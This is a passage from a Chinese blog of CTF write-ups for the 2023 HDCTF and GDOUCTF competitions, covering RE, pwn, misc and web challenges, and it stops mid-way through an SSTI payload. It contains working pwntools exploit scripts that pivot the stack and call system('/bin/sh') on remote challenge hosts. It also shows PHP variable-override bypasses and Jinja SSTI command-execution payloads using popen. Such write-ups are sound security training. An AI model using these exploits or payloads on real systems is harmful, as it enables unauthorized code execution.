class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDCTF&#123;0ce04f81-516b-4132-81a2-b0b7166e03ad&#125;</span><br></pre></td></tr></table></figure>



<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h2><p>首先进行脱壳处理</p>
<p>然后扔进IDA</p>
<p>发现base64</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422101827552.png" alt="image-20230422101827552"></p>
<p>解码即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDCTF&#123;Y0u_h@v2_/\/\@57er3d_7he_r3v3rs3&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Keep-on"><a href="#Keep-on" class="headerlink" title="Keep_on:"></a>Keep_on:</h2><p>简单的栈栈迁移问题,直接套我深藏已久的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">native = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> native:</span><br><span class="line">    p = process(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28720</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">rc = <span class="keyword">lambda</span> numb=<span class="number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> delims: p.recvuntil(delims)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = <span class="number">0x400911</span></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line">pop_rdi = <span class="number">0x4008d3</span></span><br><span class="line">ret = <span class="number">0x4005b9</span></span><br><span class="line">sla(<span class="string">&quot;name:&quot;</span>,<span class="string">b&#x27;%16$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;hello,&quot;</span>)</span><br><span class="line">rbp_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(),<span class="number">16</span>) -<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;rbp--&gt;&quot;</span>+<span class="built_in">hex</span>(rbp_addr))</span><br><span class="line">s_input = rbp_addr - <span class="number">0x50</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + flat([ret,pop_rdi,s_input,system])</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(s_input) + p64(leave_ret)</span><br><span class="line">sea(<span class="string">&quot;keep on !\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="minions"><a href="#minions" class="headerlink" title="minions:"></a>minions:</h2><p>也是一道栈迁移，跟刚刚keep_on差不多，只是多了一点计算，话不多说还直接拿出我珍藏的大脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">native = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> native:</span><br><span class="line">    p = process(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">28576</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">rc = <span class="keyword">lambda</span> numb=<span class="number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> delims: p.recvuntil(delims)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">rc = <span class="keyword">lambda</span> numb=<span class="number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> delims: p.recvuntil(delims)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">key = <span class="number">0x6010a0</span></span><br><span class="line">payload = <span class="string">b&#x27;%28$p&#x27;</span>+ <span class="string">b&#x27;%88c%8$hhna&#x27;</span>+ p64(key)</span><br><span class="line">sea(<span class="string">&quot;name?\n\n&quot;</span>,payload)</span><br><span class="line">hdf = <span class="number">0x6010c0</span></span><br><span class="line">pop_rdi = <span class="number">0x400893</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ru(<span class="string">&quot;Hello,&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(),<span class="number">16</span>) + <span class="number">0x40</span></span><br><span class="line">success(<span class="string">&quot;stack--&gt;&quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">s_input = stack - <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400581</span></span><br><span class="line">leave_ret = <span class="number">0x400758</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,ret,pop_rdi,s_input,system])</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(s_input) + p64(leave_ret)</span><br><span class="line">sea(<span class="string">&quot;you&quot;</span>,payload)</span><br><span class="line">sea(<span class="string">&quot;Minions&quot;</span>,<span class="string">b&#x27;pwn!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hardMisc"><a href="#hardMisc" class="headerlink" title="hardMisc"></a>hardMisc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$zsteg emoji.png</span><br><span class="line">[?] 40 bytes of extra data after image end (IEND), offset = 0x8a697</span><br><span class="line">extradata:0         .. text: &quot;SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ==&quot;</span><br></pre></td></tr></table></figure>

<p>base64解码即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDCTF&#123;wE1c0w3_10_HDctf_M15c&#125;</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2023HDCTF/" rel="tag">2023HDCTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2023-GDOUCTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/04/16/2023-GDOUCTF/"
    >2023 GDOUCTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/04/16/2023-GDOUCTF/" class="article-date">
  <time datetime="2023-04-16T15:17:41.000Z" itemprop="datePublished">2023-04-16</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>查看源码，点开JS代码</p>
<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416171204097.png" alt="image-20230416171204097"></p>
<p>找到这个语句，这应该就是弹出flag的语句</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="title function_">_0x324fcb</span>(<span class="number">0x2d9</span>,<span class="number">0x2c3</span>,<span class="number">0x2db</span>,<span class="number">0x2f3</span>)+<span class="string">&#x27;k3r_h0pe_t&#x27;</span>+<span class="title function_">_0xe4a674</span>(<span class="number">0x5a1</span>,<span class="number">0x595</span>,<span class="number">0x59e</span>,<span class="number">0x57c</span>)+<span class="string">&#x27;irlfriend&#125;&#x27;</span>),![];</span><br></pre></td></tr></table></figure>

<p>发现里面包含两个函数，但是源码太长看不懂干脆就直接把这一堆都放控制台</p>
<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416171858555.png" alt="image-20230416171858555"></p>
<p>然后执行</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="title function_">_0x324fcb</span>(<span class="number">0x2d9</span>,<span class="number">0x2c3</span>,<span class="number">0x2db</span>,<span class="number">0x2f3</span>)+<span class="string">&#x27;k3r_h0pe_t&#x27;</span>+<span class="title function_">_0xe4a674</span>(<span class="number">0x5a1</span>,<span class="number">0x595</span>,<span class="number">0x59e</span>,<span class="number">0x57c</span>)+<span class="string">&#x27;irlfriend&#125;&#x27;</span>),![];</span><br></pre></td></tr></table></figure>

<p>就得到flag了</p>
<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416171836729.png" alt="image-20230416171836729"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;J_0k3r_h0pe_to_have_@_girlfriend&#125;</span><br></pre></td></tr></table></figure>





<h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p>首先扫描目录，找到了   &#x2F;src</p>
<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416172225142.png" alt="image-20230416172225142"></p>
<p>访问得到源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">  <span class="keyword">return</span> flask.send_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">  <span class="keyword">return</span> flask.send_file(<span class="string">&#x27;app.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/super-secret-route-nobody-will-guess&#x27;</span>, methods=[<span class="string">&#x27;PUT&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p>只要在&#x2F;super-secret-route-nobody-will-guess 这个路径下  使用PUT方法就可以得到flag</p>
<p>BURP抓包</p>
<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416172603991.png" alt="image-20230416172603991"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;f2db3bbb-abbc-40c5-be8e-01c1f32ab51b&#125;</span><br></pre></td></tr></table></figure>



<h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;gdou&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;gdou&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;gdou&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cookie&#x27;</span>]))&#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cookie&#x27;</span>]==<span class="string">&#x27;j0k3r&#x27;</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bbb&#x27;</span>]))&#123;</span><br><span class="line">                  <span class="variable">$aaa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line">                  <span class="variable">$bbb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bbb&#x27;</span>];</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$aaa</span>==<span class="number">114514</span> &amp;&amp; <span class="variable">$bbb</span>==<span class="number">114514</span> &amp;&amp; <span class="variable">$aaa</span>!=<span class="variable">$bbb</span>)&#123;</span><br><span class="line">                   <span class="variable">$give</span> = <span class="string">&#x27;cancanwordflag&#x27;</span>;</span><br><span class="line">                   <span class="variable">$get</span> =<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">                   <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">                         <span class="keyword">die</span>(<span class="variable">$give</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                   <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">                       <span class="keyword">die</span>(<span class="variable">$get</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                         <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="variable">$f1ag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&quot;洗洗睡吧&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;行不行啊细狗&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;菜菜&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;就这?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;别来沾边&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">别来沾边</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先是数组绕过，post参数  gdou和ctf   </span><br><span class="line">然后cookie传参  cookie=j0k3r</span><br><span class="line">aaa=114514&amp;bbb=114514a</span><br><span class="line">最后就是变量覆盖问题</span><br></pre></td></tr></table></figure>



<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416211448230.png" alt="image-20230416211448230"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;72d7f2f6-3937-4655-9273-8e3a2cbeac57&#125;</span><br></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a><ez_ze></ez_ze></h2><p>首先试了一些东西没试出来，那就抓个包看看，</p>
<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416211943666.png" alt="image-20230416211943666"></p>
<p>可以联想到SSTI  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">传入&#123;&#123;&#125;&#125;发现被过滤了，然后又试一下其他的发现过滤了下面这几个</span><br><span class="line">&#123;&#123;&#125;&#125;</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">class</span><br><span class="line">[]</span><br><span class="line">&quot;</span><br><span class="line">\x5f（_）</span><br><span class="line">os</span><br></pre></td></tr></table></figure>

<p>这就很难搞了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">然后是通过&#123;%%&#125;来绕过&#123;&#123;&#125;&#125;，但是&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。</span><br><span class="line">而&#123;&#123;&#125;&#125;用于将表达式打印到模板输出。</span><br><span class="line"></span><br><span class="line">所以要想输出的话需要使用print函数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print 7*7%&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/16/2023-GDOUCTF/image-20230416212359474.png" alt="image-20230416212359474"></p>
<p>刚开始就一直按照的常规思路构造payload,但是发现过滤的东西太多了，非常难搞</p>
<p>然后就通过搜索发现了几篇文章SSTI十分详细</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/57831125204/#_56">https://www.freesion.com/article/57831125204/#_56</a></p>
<p>然后看了文章之后刚开始尝试了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.用编码转换但是这种编码转换只针对python2,但是本题是python3</span><br><span class="line">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</span><br><span class="line"></span><br><span class="line">2.然后采用了ASCII码值绕过</span><br><span class="line">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</span><br><span class="line">但是按照这种思路&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125; </span><br><span class="line">无论我怎么构造就是不正确，不知道怎么搞</span><br><span class="line"></span><br><span class="line">3.然后发现我以前做过的笔记有一种这样的方法</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">因为这种方法的payload相对于常规的payload的长度较短，通过构造的方式比较简单啦就想着试一下，</span><br><span class="line"></span><br><span class="line">然后还是通过这种方式&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</span><br><span class="line">构造出的payload为</span><br><span class="line">&#123;%print 